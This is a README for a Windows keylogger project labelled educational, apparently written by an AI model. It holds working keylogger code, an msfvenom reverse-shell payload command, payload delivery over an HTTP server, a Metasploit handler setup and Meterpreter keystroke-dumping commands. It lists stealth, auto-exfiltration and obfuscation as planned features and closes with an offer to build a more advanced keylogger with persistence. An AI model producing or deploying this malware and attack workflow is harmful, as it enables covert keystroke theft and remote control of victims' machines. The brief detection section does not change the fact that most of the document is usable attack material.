🖥️ Windows Keylogger (Educational Project)
📌 Overview

This project is a Windows keylogger developed for educational and cybersecurity research purposes.
It demonstrates how keystroke capturing works at a low level, how attackers deploy payloads, and how defenders can detect such behavior.

The project also integrates with a Meterpreter session, allowing captured keystrokes to be viewed remotely.

⚠️ Disclaimer: This tool is for learning, ethical hacking labs, virtual machines, and controlled environments only.
Misuse on systems you do not own is illegal.

🔧 Features

Real‑time keystroke capture

Windows‑compatible (tested on Win11)

Runs in the background

Optional Meterpreter keyscan integration

Log saving to file

Simple deployment over local NAT network

├── keylogger.py          # Python script for the standalone keylogger

🛠️ Installation & Setup
1. Create a Virtual Environment (Recommended on Kali)

Kali restricts global Python installs. Use:

python3 -m venv keyenv
source keyenv/bin/activate
pip install keyboard

2. Install Dependencies
pip install keyboard

3. Run the Keylogger
python3 keylogger.py


The keystrokes will be recorded into:

log.txt

💻 Example Code (keylogger.py)
import keyboard

with open("log.txt", "a") as f:
    while True:
        key = keyboard.read_event()
        if key.event_type == "down":
            f.write(key.name + "\n")

🕵️ Connecting With Meterpreter (Attack Simulation)
1. Generate a Windows Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_kali_ip> LPORT=4444 -f exe -o payload.exe

2. Transfer Payload to Windows VM

Options:

Python HTTP server

Shared folder

Drag and drop (if enabled)

Example using HTTP server:

On Kali

python3 -m http.server 8080


On Windows
Open browser → http://<kali-ip>:8080/payload.exe

3. Start Metasploit Listener
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_kali_ip>
set LPORT 4444
run

4. Use Meterpreter Keylogger

Once the session opens:

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop


This dumps keystrokes captured directly through Meterpreter’s API.

🧩 How It Works (Technical Breakdown)
Component	Description
keyboard module	Hooks Windows API to detect keypresses
while True loop	Continuously listens for keystrokes
write to file	Stores keystrokes into log.txt
meterpreter keyscan	Injects a DLL into the target process to intercept keyboard events
reverse TCP payload	Creates a command‑and‑control channel back to attacker
🛡️ Defensive Learning

This project also helps understand how to detect malware:

Monitoring for unusual processes writing to files

Detecting DLL injection behavior (Meterpreter)

Reviewing connection logs for unknown outbound traffic

Using Windows Defender or Sysmon event logs

Behavioral detection via EDR tools

📚 Learning Objectives

This project is designed to help you learn:

Malware development fundamentals

Offensive Windows techniques

Remote session management

Payload delivery methods

Keylogging internals

Security detection techniques

✨ Future Improvements

Stealth mode (run in background)

Auto‑exfiltration of logs

Better obfuscation

GUI viewer

Encryption of captured data

If you want, I can also generate:

✅ A diagram showing the attack flow
✅ A YouTube script explaining the project
✅ A GitHub banner for this repo
Or a more advanced keylogger with persistence
